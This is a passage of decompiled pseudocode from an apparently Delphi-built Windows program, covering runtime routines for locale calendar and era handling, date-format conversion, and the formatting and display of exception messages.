  v1 = 0;
  if ( a1 && *a1 )
  {
    v5[6] = dword_46C79C;
    v2 = dword_46C79C;
    if ( dword_46C79C )
      v2 = *(_DWORD *)(dword_46C79C - 4);
    System::__linkproc__ DynArraySetLength(v2 + 1);
    v5[5] = dword_46C79C;
    v3 = dword_46C79C;
    if ( dword_46C79C )
      v3 = *(_DWORD *)(dword_46C79C - 4);
    unknown_libname_50(dword_46C79C + 24 * (v3 - 1), a1);
    v1 = 1;
  }
  __writefsdword(0, v5[0]);
  return v1;
}
// 419C0D: conditional instruction was optimized away because %arg_0.4!=0
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 46C79C: using guessed type int dword_46C79C;

//----- (00419C90) --------------------------------------------------------
BOOL __stdcall sub_419C90(LPWSTR a1)
{
  int v1; // esi
  int i; // ebx
  int v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v6; // [esp-4h] [ebp-18h]
  int System__AnsiString; // [esp+Ch] [ebp-8h] BYREF
  int v8; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  System__AnsiString = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_419D16;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = 0;
  for ( i = 0; *(_DWORD *)(*(&dword_46C798 + 1) + 24 * i + 4) != -1; ++i )
  {
    v8 = *(&dword_46C798 + 1);
    v3 = v8;
    if ( v8 )
      v3 = *(_DWORD *)(v8 - 4);
    if ( i == v3 - 1 )
      goto LABEL_8;
  }
  unknown_libname_50(&System__AnsiString, a1);
  *(_DWORD *)(*(&dword_46C798 + 1) + 24 * i + 4) = Sysutils::StrToIntDef(System__AnsiString, 0);
  v1 = 1;
LABEL_8:
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_419D1D;
  sub_406C44(&System__AnsiString);
  return v1;
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46C798: using guessed type int dword_46C798;

//----- (00419D28) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__fastcall sub_419D28(LCID Locale, int a2)
{
  int v3; // eax
  CALID v4; // edi
  LCID v5; // eax
  int v6; // eax
  int v7; // esi
  int v8; // ebx
  int v9; // eax
  int v10; // eax
  LCID ThreadLocale; // eax
  int v12; // eax
  int v13; // esi
  int v14; // ebx
  LCID v15; // eax
  int v16; // ebx
  int v17; // eax
  int v18; // esi
  int v19; // ebx
  int v20; // eax
  int v21; // ecx
  int v23[2]; // [esp-18h] [ebp-48h] BYREF
  void **v24; // [esp-10h] [ebp-40h]
  _DWORD v25[6]; // [esp-Ch] [ebp-3Ch] BYREF
  __int64 v26; // [esp+Ch] [ebp-24h]
  int System__AnsiString[5]; // [esp+14h] [ebp-1Ch] BYREF
  unsigned int v28; // [esp+28h] [ebp-8h]
  int v29; // [esp+2Ch] [ebp-4h]
  void *savedregs; // [esp+30h] [ebp+0h] BYREF

  System__AnsiString[0] = 0;
  v29 = a2;
  v25[2] = &savedregs;
  v25[1] = &loc_419FCD;
  v25[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v25);
  sub_405AB4(0, a2, 0);
  v3 = sub_405E18((_DWORD *)dword_46C7A0);
  sub_405BA0(v3, 0xFFFFFFFF);
  v24 = &savedregs;
  v23[1] = (int)&loc_419FB0;
  v23[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v23);
  dword_46C798 = 0;
  System::__linkproc__ DynArraySetLength(0);
  sub_41957C(Locale, 0x100Bu, (int)dword_419FE8, System__AnsiString);
  v4 = Sysutils::StrToIntDef(System__AnsiString[0], 1);
  if ( v4 - 3 >= 3 )
  {
    if ( v4 - 1 >= 2 )
      goto LABEL_15;
    dword_46C798 = 1;
    System::__linkproc__ DynArraySetLength(1);
    sub_406FE8((volatile __int32 *)dword_46C79C, (int)L"B.C.");
    *(_DWORD *)(dword_46C79C + 4) = 0;
    v9 = dword_46C79C;
    *(_DWORD *)(dword_46C79C + 8) = -4194304;
    *(_DWORD *)(v9 + 12) = -1042284545;
    v10 = Sysutils::EncodeDate(1u, 1u, 1u);
    v26 = System::__linkproc__ TRUNC(v10);
    *(double *)(dword_46C79C + 16) = (double)v26;
    ThreadLocale = GetThreadLocale();
    EnumCalendarInfoW(CalInfoEnumProc, ThreadLocale, v4, 4u);
    System__AnsiString[4] = dword_46C79C;
    v12 = dword_46C79C;
    if ( dword_46C79C )
      v12 = *(_DWORD *)(dword_46C79C - 4);
    v13 = v12 - 1;
    if ( v12 - 1 > 0 )
    {
      v14 = 1;
      do
      {
        *(_DWORD *)(dword_46C79C + 24 * v14++ + 4) = -1;
        --v13;
      }
      while ( v13 );
    }
  }
  else
  {
    v5 = GetThreadLocale();
    EnumCalendarInfoW(CalInfoEnumProc, v5, v4, 4u);
    v28 = dword_46C79C;
    v6 = dword_46C79C;
    if ( dword_46C79C )
      v6 = *(_DWORD *)(dword_46C79C - 4);
    if ( v6 - 1 >= 0 )
    {
      v7 = v6;
      v8 = 0;
      do
      {
        *(_DWORD *)(dword_46C79C + 24 * v8++ + 4) = -1;
        --v7;
      }
      while ( v7 );
    }
  }
  v15 = GetThreadLocale();
  EnumCalendarInfoW(sub_419C90, v15, v4, 3u);
LABEL_15:
  System__AnsiString[3] = dword_46C79C;
  v16 = dword_46C79C;
  if ( dword_46C79C )
    v16 = *(_DWORD *)(dword_46C79C - 4);
  System::__linkproc__ DynArraySetLength(v16);
  System__AnsiString[2] = dword_46C79C;
  v17 = dword_46C79C;
  if ( dword_46C79C )
    v17 = *(_DWORD *)(dword_46C79C - 4);
  if ( v17 - 1 >= 0 )
  {
    v18 = v17;
    v19 = 0;
    do
    {
      sub_407F98(*(_DWORD *)(v29 + 188) + 24 * v19, dword_46C79C + 24 * v19, (int)dword_413C84);
      ++v19;
      --v18;
    }
    while ( v18 );
  }
  sub_408B34(&dword_46C79C, (int)dword_419B4C);
  System__AnsiString[1] = dword_46C79C;
  v20 = dword_46C79C;
  if ( dword_46C79C )
    v20 = *(_DWORD *)(dword_46C79C - 4);
  dword_46C798 = v20;
  v21 = (int)v24;
  __writefsdword(0, v23[0]);
  v24 = (void **)&loc_419FB7;
  sub_405D80((_DWORD *)dword_46C7A0, v23[0], v21);
  __writefsdword(0, v28);
  savedregs = &loc_419FD4;
  return sub_406C44(System__AnsiString);
}
// 419FC7: bad sp value at call
// 4050C4: using guessed type __int64 __fastcall System::__linkproc__ TRUNC(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 413C84: using guessed type int dword_413C84[8];
// 419B4C: using guessed type int dword_419B4C[8];
// 419FE8: using guessed type int dword_419FE8[4];
// 419FF8: using guessed type wchar_t aBC[5];
// 46C798: using guessed type int dword_46C798;
// 46C79C: using guessed type int dword_46C79C;
// 46C7A0: using guessed type int dword_46C7A0;

//----- (0041A004) --------------------------------------------------------
int **__fastcall sub_41A004(LCID Locale, LCTYPE LCType, int a3, int a4, int a5, volatile __int32 *a6)
{
  int **result; // eax

  result = (int **)sub_41957C(Locale, LCType, 0, a6);
  if ( !*a6 )
    return sub_40B51C(*(int ***)(a4 + 4 * a3), a6);
  return result;
}

//----- (0041A040) --------------------------------------------------------
_WORD *__usercall sub_41A040@<eax>(int *a1@<eax>, int a2)
{
  char v2; // bl
  _WORD *result; // eax

  v2 = 0;
  result = (_WORD *)sub_407790(*a1);
  if ( result )
  {
    while ( *result )
    {
      if ( *result == 39 )
        v2 ^= 1u;
      if ( *result == *(_WORD *)(a2 + 12) && !v2 )
        *result = 47;
      ++result;
    }
  }
  return result;
}

//----- (0041A084) --------------------------------------------------------
_DWORD *__userpurge sub_41A084@<eax>(
        LCID Locale@<eax>,
        LCTYPE a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        volatile __int32 *a7,
        int a8)
{
  int v9; // ebx
  unsigned __int16 v11; // si
  unsigned int v14[2]; // [esp-18h] [ebp-38h] BYREF
  int *v15; // [esp-10h] [ebp-30h]
  int v16; // [esp-Ch] [ebp-2Ch]
  int v17; // [esp-8h] [ebp-28h]
  int v18; // [esp-4h] [ebp-24h]
  void *v19; // [esp+0h] [ebp-20h] BYREF
  void *v20; // [esp+4h] [ebp-1Ch] BYREF
  void *v21; // [esp+8h] [ebp-18h] BYREF
  int System__AnsiString; // [esp+Ch] [ebp-14h] BYREF
  int v23; // [esp+10h] [ebp-10h]
  int v24; // [esp+14h] [ebp-Ch]
  LCTYPE LCType; // [esp+18h] [ebp-8h]
  int v26; // [esp+1Ch] [ebp-4h] BYREF
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v26 = 0;
  v23 = 0;
  System__AnsiString = 0;
  v21 = 0;
  v20 = 0;
  v19 = 0;
  v18 = a4;
  v17 = a6;
  v16 = a5;
  v24 = a3;
  LCType = a2;
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_41A2BE;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  v9 = 1;
  sub_406C44(a7);
  sub_41957C(Locale, LCType, v24, &v26);
  sub_41957C(Locale, 0x1009u, (int)dword_41A2DC, &System__AnsiString);
  if ( (unsigned int)(Sysutils::StrToIntDef(System__AnsiString, 1) - 3) < 3 )
  {
    while ( v9 <= System::__linkproc__ LStrLen(v26) )
    {
      v11 = *(_WORD *)(v26 + 2 * v9 - 2);
      if ( v11 >= 0xD800u && v11 <= 0xDFFFu )
      {
        v23 = sub_41B798(v26, v9) / 2;
        sub_41C5E4(&v26, v9 - 1, v23, &v20);
        sub_407910(a7, v20);
        v9 += v23;
      }
      else
      {
        if ( sub_41C320(v26, v9 - 1, (int)L"gg", 0, 2, 1) )
        {
          if ( sub_41C320(v26, v9 - 1, (int)L"yyyy", 0, 4, 1) )
          {
            if ( sub_41C320(v26, v9 - 1, (int)L"yy", 0, 2, 1) )
            {
              if ( *(_WORD *)(v26 + 2 * v9 - 2) == 89 || *(_WORD *)(v26 + 2 * v9 - 2) == 121 )
              {
                sub_407910(a7, &dword_41A36C);
              }
              else
              {
                unknown_libname_48(&v19, *(unsigned __int16 *)(v26 + 2 * v9 - 2));
                sub_407910(a7, v19);
              }
            }
            else
            {
              sub_407910(a7, L"ee");
              ++v9;
            }
          }
          else
          {
            sub_407910(a7, L"eeee");
            v9 += 3;
          }
        }
        else
        {
          sub_407910(a7, L"ggg");
          ++v9;
        }
        ++v9;
      }
    }
  }
  else if ( dword_46C68C == 4 || (unsigned int)(dword_46C68C - 17) < 2 )
  {
    while ( v9 <= System::__linkproc__ LStrLen(v26) )
    {
      if ( *(_WORD *)(v26 + 2 * v9 - 2) != 71 && *(_WORD *)(v26 + 2 * v9 - 2) != 103 )
      {
        unknown_libname_48(&v21, *(unsigned __int16 *)(v26 + 2 * v9 - 2));
        sub_407910(a7, v21);
      }
      ++v9;
    }
  }
  else
  {
    sub_406FE8(a7, v26);
  }
  sub_41A040((int *)a7, (int)&savedregs);
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_41A2C5;
  sub_406CA4((int)&v19, 4);
  return sub_406C44(&v26);
}
// 41A084: could not find valid save-restore pair for ebx
// 41A084: could not find valid save-restore pair for edi
// 41A084: could not find valid save-restore pair for esi
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4077A8: using guessed type int __fastcall unknown_libname_48(_DWORD, _DWORD);
// 41A2DC: using guessed type int dword_41A2DC[4];
// 41A2EC: using guessed type wchar_t aGg_0[3];
// 41A300: using guessed type wchar_t aGgg[4];
// 41A314: using guessed type wchar_t aYyyy_0[5];
// 41A32C: using guessed type wchar_t aEeee[5];
// 41A344: using guessed type wchar_t aYy_0[3];
// 41A358: using guessed type wchar_t aEe[3];
// 41A36C: using guessed type int dword_41A36C;
// 46C68C: using guessed type int dword_46C68C;

//----- (0041A370) --------------------------------------------------------
int __fastcall sub_41A370(int a1, int a2)
{
  int v3; // eax
  int v4; // edi
  int i; // ebx
  _WORD *v6; // eax
  _WORD *v8; // [esp-4h] [ebp-20h]
  int v10; // [esp+4h] [ebp-18h]
  int v11; // [esp+8h] [ebp-14h]

  v10 = 0;
  v11 = *(_DWORD *)(a1 + 188);
  v3 = v11;
  if ( v11 )
    v3 = *(_DWORD *)(v11 - 4);
  if ( v3 - 1 >= 0 )
  {
    v4 = v3;
    for ( i = 0; *(_DWORD *)(*(_DWORD *)(a1 + 188) + 24 * i); ++i )
    {
      v8 = (_WORD *)sub_407790(*(_DWORD *)(*(_DWORD *)(a1 + 188) + 24 * i));
      v6 = (_WORD *)sub_407790(a2);
      if ( sub_41B888(v8, v6) )
        return *(_DWORD *)(*(_DWORD *)(a1 + 188) + 24 * i + 4);
      if ( !--v4 )
        return v10;
    }
  }
  return v10;
}

//----- (0041A408) --------------------------------------------------------
int __fastcall sub_41A408(int *a1, LPCVOID lpAddress, _WORD *a3, int a4)
{
  _WORD *v6; // eax
  int *v7; // ebx
  int *v8; // edi
  int v9; // eax
  HINSTANCE v10; // eax
  int v11; // ebx
  int *v13; // [esp-18h] [ebp-688h]
  unsigned int v14[2]; // [esp-Ch] [ebp-67Ch] BYREF
  int *v15; // [esp-4h] [ebp-674h]
  int v16; // [esp+Ch] [ebp-664h] BYREF
  int v17; // [esp+10h] [ebp-660h] BYREF
  char v18; // [esp+14h] [ebp-65Ch]
  char *v19; // [esp+18h] [ebp-658h]
  char v20; // [esp+1Ch] [ebp-654h]
  int v21; // [esp+20h] [ebp-650h]
  char v22; // [esp+24h] [ebp-64Ch]
  int *v23; // [esp+28h] [ebp-648h]
  char v24; // [esp+2Ch] [ebp-644h]
  int *v25; // [esp+30h] [ebp-640h]
  char v26; // [esp+34h] [ebp-63Ch]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+38h] [ebp-638h] BYREF
  WCHAR v28[256]; // [esp+54h] [ebp-61Ch] BYREF
  WCHAR Filename[261]; // [esp+254h] [ebp-41Ch] BYREF
  char v30[522]; // [esp+45Eh] [ebp-212h] BYREF
  int v31; // [esp+668h] [ebp-8h]
  _WORD *v32; // [esp+66Ch] [ebp-4h]
  int savedregs; // [esp+670h] [ebp+0h] BYREF

  v16 = 0;
  v32 = a3;
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_41A5B4;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  VirtualQuery_0(lpAddress, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameW_0((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v31 = (_BYTE *)lpAddress - (_BYTE *)Buffer.AllocationBase;
  }
  else
  {
    GetModuleFileNameW_0(hModule, Filename, 0x105u);
    v31 = unknown_libname_84(lpAddress);
  }
  v6 = sub_41B890(Filename, 92);
  sub_415900(v30, v6 + 1, 0x104u);
  v7 = &dword_41A5C8;
  v8 = &dword_41A5C8;
  if ( sub_40576C(a1, (int)off_411F40) )
  {
    v7 = (int *)sub_407790(a1[1]);
    v9 = sub_407124((int)v7);
    if ( v9 )
    {
      if ( *((_WORD *)v7 + v9 - 1) != 46 )
        v8 = &dword_41A5CC;
    }
  }
  v13 = off_4681C8[0][1];
  v10 = (HINSTANCE)sub_408BFC((int)hModule);
  LoadStringW_0(v10, (UINT)v13, v28, 256);
  sub_405514(*a1, (int)&v16);
  v17 = v16;
  v18 = 17;
  v19 = v30;
  v20 = 10;
  v21 = v31;
  v22 = 5;
  v23 = v7;
  v24 = 10;
  v25 = v8;
  v26 = 10;
  sub_415B68(v32, a4, (unsigned int)v28, (int)&v17, 4);
  v11 = sub_407124((int)v32);
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_41A5BB;
  sub_406C44(&v16);
  return v11;
}
// 411F40: using guessed type int (*off_411F40[2])();
// 41A3FC: using guessed type int __fastcall unknown_libname_84(_DWORD);
// 41A5C8: using guessed type int dword_41A5C8;
// 41A5CC: using guessed type int dword_41A5CC;
// 4681C8: using guessed type int **off_4681C8[2];

//----- (0041A600) --------------------------------------------------------
_DWORD *__fastcall sub_41A600(int *a1, const void *a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // ebx
  HANDLE StdHandle_0; // eax
  HANDLE v6; // eax
  HINSTANCE v7; // eax
  LPSTR v9; // [esp-1Ch] [ebp-8ACh]
  int *v10; // [esp-18h] [ebp-8A8h]
  unsigned int v11[2]; // [esp-Ch] [ebp-89Ch] BYREF
  int *v12; // [esp-4h] [ebp-894h]
  WCHAR WideCharStr[1024]; // [esp+8h] [ebp-888h] BYREF
  WCHAR Buffer[64]; // [esp+808h] [ebp-88h] BYREF
  DWORD NumberOfBytesWritten; // [esp+888h] [ebp-8h] BYREF
  LPSTR lpMultiByteStr; // [esp+88Ch] [ebp-4h] BYREF
  int savedregs; // [esp+890h] [ebp+0h] BYREF

  lpMultiByteStr = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_41A725;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v2 = sub_41A408(a1, a2, WideCharStr, 1024);
  if ( *off_468114 )
  {
    v3 = System::Flush(off_467F7C);
    System::__linkproc__ _IOTest(v3);
    v4 = WideCharToMultiByte_0(1u, 0, WideCharStr, v2, 0, 0, 0, 0);
    System::__linkproc__ DynArraySetLength(v4);
    WideCharToMultiByte_0(1u, 0, WideCharStr, v2, lpMultiByteStr, v4, 0, 0);
    v9 = lpMultiByteStr;
    StdHandle_0 = GetStdHandle_0(0xFFFFFFF4);
    WriteFile_1(StdHandle_0, v9, v4, &NumberOfBytesWritten, 0);
    v6 = GetStdHandle_0(0xFFFFFFF4);
    WriteFile_1(v6, &dword_41A740, 2u, &NumberOfBytesWritten, 0);
  }
  else
  {
    v10 = off_467F4C[0][1];
    v7 = (HINSTANCE)sub_408BFC((int)hModule);
    LoadStringW_0(v7, (UINT)v10, Buffer, 64);
    MessageBoxW(0, WideCharStr, Buffer, 0x2010u);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_41A72C;
  return sub_408B34(&lpMultiByteStr, (int)&byte_41A5D4);
}
// 404EE8: using guessed type int __fastcall System::__linkproc__ _IOTest(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 41A5D4: using guessed type char byte_41A5D4;
// 41A740: using guessed type int dword_41A740;
// 467F4C: using guessed type int **off_467F4C[6];
// 468114: using guessed type char *off_468114;

//----- (0041A8D0) --------------------------------------------------------
int sub_41A8D0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  unknown_libname_94(v0 + 12);
  if ( dword_46C684 )
    dword_46C684(*(_DWORD *)(v2 + 16));
  *(_DWORD *)(v2 + 16) = 0;
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 46C684: using guessed type int (__fastcall *dword_46C684)(_DWORD);

//----- (0041A914) --------------------------------------------------------
int __fastcall sub_41A914(int result)
{
  while ( *(_DWORD *)(result + 12) )
    result = *(_DWORD *)(result + 12);
  return result;
}

//----- (0041A920) --------------------------------------------------------
_DWORD *__fastcall sub_41A920(int a1, _DWORD *a2)
{
  if ( dword_46C680 )
    return (_DWORD *)dword_46C680(*(_DWORD *)(a1 + 16), a2);
  else
    return sub_406C44(a2);
}
// 46C680: using guessed type int (__fastcall *dword_46C680)(_DWORD, _DWORD);

//----- (0041A948) --------------------------------------------------------
char __fastcall sub_41A948(int a1, int a2)
{
  char result; // al
  int v5; // eax

  result = sub_41A974(a1);
  if ( dword_46C67C )
  {
    v5 = dword_46C67C(a2);
    return sub_41A99C(a1, v5);
  }
  return result;
}
// 46C67C: using guessed type int (__fastcall *dword_46C67C)(_DWORD);

//----- (0041A974) --------------------------------------------------------
char __fastcall sub_41A974(int a1)
{
  int v1; // ebx
  int *v2; // eax

  v1 = a1;
  if ( *(_BYTE *)(a1 + 20) )
  {
    v2 = (int *)System::ExceptObject();
    LOBYTE(a1) = sub_40576C(v2, (int)off_411F40);
    if ( (_BYTE)a1 )
    {
      a1 = sub_404E38();
      *(_DWORD *)(v1 + 12) = a1;
    }
  }
  return a1;
}
// 411F40: using guessed type int (*off_411F40[2])();

//----- (0041A99C) --------------------------------------------------------
int __fastcall sub_41A99C(int result, int a2)
{
  *(_DWORD *)(result + 16) = a2;
  return result;
}

//----- (0041A9A0) --------------------------------------------------------
void *__fastcall sub_41A9A0(int a1, int *a2)
{
  void *result; // eax

  for ( result = sub_406C44(a2); a1; a1 = *(_DWORD *)(a1 + 12) )
  {
    if ( *a2 )
      result = (void *)sub_4079F0(a2, 3);
    else
      result = (void *)sub_406FE8(a2, *(_DWORD *)(a1 + 4));
  }
  return result;
}

//----- (0041A9F8) --------------------------------------------------------
int __fastcall sub_41A9F8(int result)
{
  if ( *(_BYTE *)(result + 24) )
    return sub_405554((int *)result);
  return result;
}

//----- (0041AA6C) --------------------------------------------------------
int __usercall sub_41AA6C@<eax>(unsigned __int8 a1@<al>, int a2@<edx>, int a3@<ebp>, int a4@<edi>, int a5@<esi>)
{
  int (***v6)(); // edx
  int v7; // edx

  if ( a1 == 1 )
  {
    v7 = dword_46C7A4;
  }
  else if ( a1 == 2 )
  {
    v7 = dword_46C7A8;
  }
  else if ( (unsigned __int8)(a1 - 3) < 0x1Au )
  {
    v6 = off_467F64;
    LOBYTE(v6) = 1;
    v7 = unknown_libname_85(
           off_467F64[(unsigned __int8)*((char *)off_468170 + 8 * a1 - 24)],
           v6,
           *((_DWORD *)off_468170 + 2 * a1 - 5));
  }
  else
  {
    v7 = unknown_libname_86();
  }
  if ( a2 )
    return sub_406340(v7, a2, a3, a4, a5);
  else
    return sub_406340(v7, 0, a3, a4, a5);
}
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 41AA0C: using guessed type int unknown_libname_86(void);
// 467F64: using guessed type int (***off_467F64)();
// 468170: using guessed type void *off_468170;
// 46C7A4: using guessed type int dword_46C7A4;
// 46C7A8: using guessed type int dword_46C7A8;

//----- (0041AADC) --------------------------------------------------------
int __usercall sub_41AADC@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        int a7)
{
  int v10; // eax
  _DWORD v12[6]; // [esp-18h] [ebp-3Ch] BYREF
  int v13; // [esp+0h] [ebp-24h] BYREF
  int v14; // [esp+4h] [ebp-20h] BYREF
  int v15; // [esp+8h] [ebp-1Ch] BYREF
  int v16; // [esp+Ch] [ebp-18h] BYREF
  char v17; // [esp+10h] [ebp-14h]
  int v18; // [esp+14h] [ebp-10h]
  char v19; // [esp+18h] [ebp-Ch]
  int v20; // [esp+1Ch] [ebp-8h]
  char v21; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v12[5] = a4;
  v12[4] = a6;
  v12[3] = a5;
  v14 = 0;
  v13 = 0;
  v15 = 0;
  v12[2] = &savedregs;
  v12[1] = System::__linkproc__ HandleFinally;
  v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  if ( a1 )
  {
    v16 = a1;
    v17 = 17;
    v18 = a2;
    v19 = 17;
    v20 = a3;
    v21 = 0;
    sub_40B51C((int **)off_468158, &v15);
  }
  else
  {
    sub_40B51C((int **)off_4680F0, &v14);
    v16 = v14;
    v17 = 17;
    v18 = a2;
    v19 = 17;
    v20 = a3;
    v21 = 0;
    sub_40B51C((int **)off_468158, &v13);
  }
  v10 = Sysutils::Exception::Exception(2, &v16);
  return sub_406340(v10, a1, (int)&savedregs, a3, a2);
}
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);
// 41ABB3: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);

//----- (0041ABC4) --------------------------------------------------------
int __usercall sub_41ABC4@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>)
{
  int v4; // eax

  v4 = Sysutils::Exception::Exception((int)off_413680, 1, off_467F60);
  return sub_406340(v4, a1, a2, a3, a4);
}
// 413680: using guessed type int (*off_413680[2])();

//----- (0041AC5C) --------------------------------------------------------
int (**__fastcall sub_41AC5C(int a1))()
{
  return off_467F64[(unsigned __int8)*((char *)off_468170 + 8 * (unsigned __int8)unknown_libname_87(a1) - 24)];
}
// 41ABDC: using guessed type int __fastcall unknown_libname_87(_DWORD);
// 467F64: using guessed type int (***off_467F64)();
// 468170: using guessed type void *off_468170;

//----- (0041AC80) --------------------------------------------------------
int __cdecl sub_41AC80(int a1)
{
  int v1; // eax
  bool v2; // cf
  int v3; // eax
  int v4; // ebx
  int v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-288h] BYREF
  int *v8; // [esp-4h] [ebp-280h]
  int v9; // [esp+8h] [ebp-274h] BYREF
  int v10; // [esp+Ch] [ebp-270h] BYREF
  char v11; // [esp+10h] [ebp-26Ch]
  int v12; // [esp+14h] [ebp-268h]
  char v13; // [esp+18h] [ebp-264h]
  int v14; // [esp+1Ch] [ebp-260h]
  char v15; // [esp+20h] [ebp-25Ch]
  int v16; // [esp+24h] [ebp-258h] BYREF
  int v17; // [esp+28h] [ebp-254h] BYREF
  int v18; // [esp+2Ch] [ebp-250h] BYREF
  int v19; // [esp+30h] [ebp-24Ch] BYREF
  char v20; // [esp+34h] [ebp-248h]
  int v21; // [esp+38h] [ebp-244h]
  char v22; // [esp+3Ch] [ebp-240h]
  int v23; // [esp+40h] [ebp-23Ch]
  char v24; // [esp+44h] [ebp-238h]
  int v25; // [esp+48h] [ebp-234h]
  char v26; // [esp+4Ch] [ebp-230h]
  WCHAR Filename[261]; // [esp+52h] [ebp-22Ah] BYREF
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+25Ch] [ebp-20h] BYREF
  int v29; // [esp+278h] [ebp-4h] BYREF
  int savedregs; // [esp+27Ch] [ebp+0h] BYREF

  v9 = 0;
  v18 = 0;
  v16 = 0;
  v17 = 0;
  v29 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41AE86;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v1 = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 20);
  v2 = v1 == 0;
  v3 = v1 - 1;
  if ( v2 )
  {
    sub_40B51C((int **)off_4681FC, &v29);
  }
  else if ( v3 )
  {
    if ( v3 == 7 )
      sub_40B51C((int **)off_467F10, &v29);
    else
      sub_40B51C((int **)off_46801C, &v29);
  }
  else
  {
    sub_40B51C((int **)off_4680CC, &v29);
  }
  v4 = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 24);
  VirtualQuery_0(*(LPCVOID *)(*(_DWORD *)(a1 - 4) + 12), &Buffer, 0x1Cu);
  if ( (Buffer.State == 4096 || Buffer.State == 0x10000)
    && GetModuleFileNameW_0((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v19 = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 12);
    v20 = 5;
    unknown_libname_51(&v17, Filename, 261);
    sub_415824(v17, &v18);
    v21 = v18;
    v22 = 17;
    v23 = v29;
    v24 = 17;
    v25 = v4;
    v26 = 5;
    sub_40B51C((int **)off_468130, &v16);
    v5 = Sysutils::Exception::Exception(3, &v19);
  }
  else
  {
    v10 = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 12);
    v11 = 5;
    v12 = v29;
    v13 = 17;
    v14 = v4;
    v15 = 5;
    sub_40B51C((int **)off_4680D0, &v9);
    v5 = Sysutils::Exception::Exception(2, &v10);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41AE8D;
  sub_406C44(&v9);
  sub_406CA4((int)&v16, 3);
  sub_406C44(&v29);
  return v5;
}
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);

//----- (0041AE98) --------------------------------------------------------
int *__fastcall sub_41AE98(int *a1)
{
  int v1; // eax
  int (**v2)(); // edx
  int v3; // ecx
  int *v4; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v7; // [esp-8h] [ebp-1Ch]
  int *v8; // [esp-4h] [ebp-18h]
  void *v9; // [esp+0h] [ebp-14h]
  int v10; // [esp+4h] [ebp-10h] BYREF
  int v11; // [esp+8h] [ebp-Ch] BYREF
  char v12; // [esp+Ch] [ebp-8h]
  int *v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = 0;
  v13 = a1;
  v8 = &savedregs;
  v7 = &loc_41AF6D;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v1 = (unsigned __int8)unknown_libname_87(a1);
